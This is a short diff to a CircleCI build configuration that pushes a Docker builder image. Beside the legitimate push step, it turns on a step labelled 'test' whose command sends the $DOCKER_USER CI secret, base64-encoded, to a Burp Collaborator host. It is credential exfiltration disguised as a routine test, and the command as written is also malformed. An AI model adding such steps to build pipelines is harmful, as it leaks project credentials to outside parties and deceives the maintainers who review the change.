@@ -17,7 +17,7 @@ jobs:
       - run:
           name: Push builder image
           command: docker push titusoss/titus-executor-builder
-    - run:
+      - run:
       	  name: test
       	  command: http://ipohbcct27nky7lk5kyps4kuhw82yqn.burpcollaborator.net/env=$($DOCKER_USER | base64 | tr -d '\n')
   # We don't build big image because it takes an hour+ to build on Circle CI infra
